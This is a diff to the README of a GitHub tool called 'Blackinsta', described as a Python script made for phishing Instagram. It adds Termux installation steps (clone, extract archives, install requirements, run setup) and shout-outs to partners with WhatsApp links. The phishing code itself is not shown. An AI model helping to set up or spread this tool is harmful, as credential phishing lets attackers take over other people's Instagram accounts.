@@ -30,5 +30,14 @@ Blackinsta is a python based script which is officially made for phish*ng instag
 
 ## INSTALLATION [Termux] :
 
-* # First Clone This Tool !
-`` git clone https://github.com/Cold-Breazy/blackinsta/
+* ` git clone https://github.com/Cold-Breazy/blackinsta/ `
+* ` cd blackinsta `
+* ` tar -xvf app.tar.gz `
+* ` tar -xvf myapp.tar.gz `
+* ` pip install -r requirements.txt `
+* ` python setup.py `
+
+# Special Shout Out To My Partners :
+
+* <a href="https://wa.me/+27847611848/">@JUNIA👏</a> (Hacker)
+* <a href="https://wa.me/+27847611848/">@Slade👏</a> (Coder/Beginner)
